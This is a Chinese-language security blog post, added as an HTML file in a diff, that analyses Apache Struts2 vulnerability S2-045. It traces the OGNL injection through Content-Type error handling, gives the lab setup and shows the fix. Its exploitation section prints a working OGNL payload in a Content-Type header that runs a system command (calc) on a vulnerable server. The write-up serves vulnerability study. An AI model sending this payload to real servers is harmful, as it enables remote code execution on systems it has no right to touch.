@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>struts2系列漏洞 S2-045 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期五, 七月 31日 2020, 4:30 下午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    942 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      4 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.29 版本 struts2 + Tomcat 9。</p>
+<p>在 struts.xml 中加上用于存放临时文件的 saveDir，当然不加也没什么关系：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.multipart.saveDir&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload/&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改前端表单：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s:form</span> <span class="attr">action</span>=<span class="string">&quot;login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s:file</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">label</span>=<span class="string">&quot;选择上传的文件&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s:submit</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后修改 Action，加上文件上传相关的属性以及他们的 getter、setter，后面两个属性应该也用不上：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> File upload;</span><br><span class="line"><span class="keyword">private</span> String uploadContentType;</span><br><span class="line"><span class="keyword">private</span> String uploadFileName;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据<a href="https://cwiki.apache.org/confluence/display/WW/S2-045">官方通告</a>，问题发生在 Jakarta 解析 HTTP 头中的 Content-Type 时，如果 Content-Type 非法，struts2 会将错误抛出，而这里存在一个 OGNL 表达式注入。</p>
+<p>开始调试，给 JakartaMultiPartRequest 类的 parse 函数下断点，结果发现修改 Content-Type 无法触发断点，往前跟踪到 Dispatcher 类的 wrapRequest 函数可以发现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HttpServletRequest <span class="title function_">wrapRequest</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// don&#x27;t wrap more than once</span></span><br><span class="line">    <span class="keyword">if</span> (request <span class="keyword">instanceof</span> StrutsRequestWrapper) &#123;</span><br><span class="line">        <span class="keyword">return</span> request;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">content_type</span> <span class="operator">=</span> request.getContentType();</span><br><span class="line">    <span class="keyword">if</span> (content_type != <span class="literal">null</span> &amp;&amp; content_type.contains(<span class="string">&quot;multipart/form-data&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">MultiPartRequest</span> <span class="variable">mpr</span> <span class="operator">=</span> getMultiPartRequest();</span><br><span class="line">        <span class="type">LocaleProvider</span> <span class="variable">provider</span> <span class="operator">=</span> getContainer().getInstance(LocaleProvider.class);</span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">MultiPartRequestWrapper</span>(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">StrutsRequestWrapper</span>(request, disableRequestAttributeValueStackLookup);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> request;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>content_type 中要包含 multipart&#x2F;form-data 这个字符串，struts2 才会调用 Jakarta 进行下一步解析，我们回到 parse 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parse</span><span class="params">(HttpServletRequest request, String saveDir)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        setLocale(request);</span><br><span class="line">        processUpload(request, saveDir);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileUploadBase.SizeLimitExceededException e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">        	LOG.warn(<span class="string">&quot;Request exceeded size limit!&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> buildErrorMessage(e, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;e.getPermittedSize(), e.getActualSize()&#125;);</span><br><span class="line">        <span class="keyword">if</span> (!errors.contains(errorMessage)) &#123;</span><br><span class="line">        	errors.add(errorMessage);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">        	LOG.warn(<span class="string">&quot;Unable to parse request&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> buildErrorMessage(e, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="keyword">if</span> (!errors.contains(errorMessage)) &#123;</span><br><span class="line">        	errors.add(errorMessage);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>观察捕获异常后调用的 buildErrorMessage 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">buildErrorMessage</span><span class="params">(Throwable e, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">errorKey</span> <span class="operator">=</span> <span class="string">&quot;struts.messages.upload.error.&quot;</span> + e.getClass().getSimpleName();</span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">    	LOG.debug(<span class="string">&quot;Preparing error message for key: [#0]&quot;</span>, errorKey);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> LocalizedTextUtil.findText(<span class="built_in">this</span>.getClass(), errorKey, defaultLocale, e.getMessage(), args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会将错误信息做参调用 findText 函数，继续跟踪可以来到 getDefaultMessage 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> GetDefaultMessageReturnArg <span class="title function_">getDefaultMessage</span><span class="params">(String key, Locale locale, ValueStack valueStack, Object[] args, String defaultMessage)</span> &#123;</span><br><span class="line">    <span class="type">GetDefaultMessageReturnArg</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">found</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (key != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> findDefaultText(key, locale);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (message == <span class="literal">null</span>) &#123;</span><br><span class="line">            message = defaultMessage;</span><br><span class="line">            found = <span class="literal">false</span>; <span class="comment">// not found in bundles</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// defaultMessage may be null</span></span><br><span class="line">        <span class="keyword">if</span> (message != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">MessageFormat</span> <span class="variable">mf</span> <span class="operator">=</span> buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> formatWithNullDetection(mf, args);</span><br><span class="line">            result = <span class="keyword">new</span> <span class="title class_">GetDefaultMessageReturnArg</span>(msg, found);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用 translateVariables 将错误信息当成了一个 OGNL 表达式来解析，所以如果我们能控制报错信息，我们就能进行 OGNL 表达式注入。</p>
+<p>接下来观察 processUpload 函数的解析过程，来到跟 Content-Type 有关的 FileUploadBase 类的 FileItemIteratorImpl 函数，可以看到这里会抛出 InvalidContentTypeException：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">contentType</span> <span class="operator">=</span> ctx.getContentType();</span><br><span class="line"><span class="keyword">if</span> ((<span class="literal">null</span> == contentType)</span><br><span class="line">	|| (!contentType.toLowerCase(Locale.ENGLISH).startsWith(MULTIPART))) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidContentTypeException</span>(</span><br><span class="line">        format(<span class="string">&quot;the request doesn&#x27;t contain a %s or %s stream, content type header is %s&quot;</span>,</span><br><span class="line">        	MULTIPART_FORM_DATA, MULTIPART_MIXED, contentType));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果 Content-Type 不以  multipart&#x2F; 开头，就会抛出这个异常，而且将 Content-Type 拼接进了错误信息里面，这样利用链就完成了。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>跟之前 S2-037 的 payload 一致，如果是更高版本的 struts2，则要复杂一些，具体的后面再分析，这里贴一个 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: Twings multipart/form-data %&#123;(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;))&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>2.3.32 版本的修复，修改了 buildErrorMessage 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (LocalizedTextUtil.findText(<span class="built_in">this</span>.getClass(), errorKey, defaultLocale, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]) == <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> LocalizedTextUtil.findText(<span class="built_in">this</span>.getClass(), <span class="string">&quot;struts.messages.error.uploading&quot;</span>, defaultLocale, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; e.getMessage() &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> LocalizedTextUtil.findText(<span class="built_in">this</span>.getClass(), errorKey, defaultLocale, <span class="literal">null</span>, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不再将错误信息作为 defaultMessage 传入 findText 函数。</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/t/4605">https://xz.aliyun.com/t/4605</a></p>
+<p><a href="https://xz.aliyun.com/t/3395">https://xz.aliyun.com/t/3395</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Struts2/">Struts2</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/08/02/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-046/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>struts2系列漏洞 S2-046</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/07/29/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-037/">
+                        <span>struts2系列漏洞 S2-037</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "struts2系列漏洞 S2-045&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
